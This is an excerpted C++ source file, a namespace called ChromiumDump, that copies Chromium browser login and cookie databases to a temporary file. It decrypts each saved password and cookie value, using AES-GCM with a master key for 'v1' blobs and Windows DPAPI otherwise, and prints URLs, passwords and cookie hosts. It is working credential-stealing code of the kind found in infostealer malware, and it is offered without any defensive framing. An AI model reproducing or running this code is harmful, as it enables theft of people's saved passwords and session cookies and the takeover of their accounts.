...
namespace ChromiumDump {
    ...
    inline std::wstring CopyDbToTemp(const std::wstring& dbPath,
        ...
        if (!CopyFileW(dbPath.c_str(), tempDbPath.c_str(), FALSE)) return L"";
        return tempDbPath;
    }

    inline void DumpPasswords(const std::wstring& profilePath,
        ...
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                ...
                if (blobData && blobSize > 31 && blobData[0] == 'v' && blobData[1] == '1') {
                    password = CryptoEngine::DecryptAESGCM(blobData + 15, blobSize - 31,
                                                          blobData + 3,
                                                          blobData + (blobSize - 16),
                                                          masterKey);
                } else if (blobData && blobSize > 0) {
                    std::vector<BYTE> enc(blobData, blobData + blobSize);
                    password = CryptoEngine::DecryptDPAPI(enc);
                }
                if (!password.empty()) {
                    std::cout << "  [PASS] URL: " << (url ? (const char*)url : "")
    ...
    inline void DumpCookies(const std::wstring& profilePath,
                            const std::vector<BYTE>& masterKey) {
        ...
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                ...
                if (blobData && blobSize > 31 && blobData[0] == 'v' && blobData[1] == '1') {
                    cookieVal = CryptoEngine::DecryptAESGCM(blobData + 15, blobSize - 31,
                                                            blobData + 3,
                                                            blobData + (blobSize - 16),
                                                            masterKey);
                } else if (blobData && blobSize > 0) {
                    std::vector<BYTE> enc(blobData, blobData + blobSize);
                    cookieVal = CryptoEngine::DecryptDPAPI(enc);
                }
                if (!cookieVal.empty()) {
                    std::cout << "  [COOKIE] Host: " << (host ? (const char*)host : "")
